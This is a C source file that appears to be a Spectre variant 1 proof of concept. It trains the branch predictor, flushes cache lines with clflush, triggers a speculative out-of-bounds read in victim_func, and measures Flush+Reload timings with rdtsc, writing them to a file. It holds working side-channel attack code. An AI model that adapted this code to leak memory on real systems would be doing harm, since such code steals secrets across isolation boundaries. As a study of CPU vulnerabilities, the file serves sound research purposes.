#include <stdio.h>
#include <x86intrin.h>
#include <unistd.h>
#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#define TARGET_ARRAY_LENGTH 256
#define ELEMENT_DISTANCE 512
#define CACHE_LINE_SIZE 64

uint64_t x[16 * sizeof(uint64_t)];
uint64_t y[16 * sizeof(uint64_t)];
uint64_t bounds[16 * sizeof(uint64_t)];

void shuffle_array(size_t array[]){
    srand(time(NULL));
    for(int i = TARGET_ARRAY_LENGTH - 1; i > 0; i--){
        size_t random_index = rand() % (i + 1);
        size_t tmp = array[random_index];
        array[random_index] = array[i];
        array[i] = tmp;
    }
    return;
}

void victim_func(int index, uint8_t *array_to_write){
    if(index < bounds[0]){
        //y[0] = 0;
        //array_to_write[x[0] * ELEMENT_DISTANCE] = 0;
        y[0] = array_to_write[x[0] * ELEMENT_DISTANCE];
        //printf("Victim func was executed\n");
    }
    return;
}

void flush_array(void *array_to_flush){
    void* addr_ptr = array_to_flush;
    for(int i = 0; i < TARGET_ARRAY_LENGTH; i++){
        _mm_clflush(addr_ptr);
        addr_ptr += ELEMENT_DISTANCE;
    }
    return;
}

void reload_array(void *array_to_reload){
    size_t indices[TARGET_ARRAY_LENGTH];
    for(size_t i = 0; i < TARGET_ARRAY_LENGTH; i++){
        indices[i] = i;
    }
    shuffle_array(indices);
    uint64_t results[TARGET_ARRAY_LENGTH];
    void* addr_ptr;
    size_t current_index;
    for(int i = 0; i < TARGET_ARRAY_LENGTH; i++){
        current_index = indices[i];
        addr_ptr = array_to_reload + current_index * ELEMENT_DISTANCE;
        uint64_t reload_time;
        asm (
            "mfence \n"
            "lfence \n"
            "rdtsc \n" 
            "lfence \n"
            "mov %%rax, %%rsi \n"
            "mov (%1), %%al \n"
            "lfence \n"
            "rdtsc \n"
            "sub %%rsi, %%rax\n"
            : "=a" (reload_time)
            : "c" (addr_ptr)
        );
        results[current_index] = reload_time;
    }
    FILE *result_ptr;
    result_ptr = fopen("../output/array_timing.txt", "w");
    for(int i = 0; i < TARGET_ARRAY_LENGTH; i++){
        fprintf(result_ptr, "%li %i\n", results[i], i);
    }
    return;
}

int main(int argc, char* argv[]){
    uint64_t isolation[16];
    uint8_t huge_array[TARGET_ARRAY_LENGTH * ELEMENT_DISTANCE];
    uint64_t trash[16];
    void* target_array = &huge_array;
    x[0] = 157;
    bounds[0] = 150;
    for(int i = 0; i < 8; i++){
        victim_func(i, target_array);
    }
    //printf("---- END OF BRANCH PREDICTOR TRAINING ----\n");
    _mm_clflush(&bounds[0]);
    flush_array(target_array);
    victim_func(200, target_array);
    reload_array(target_array);
    return 0;
}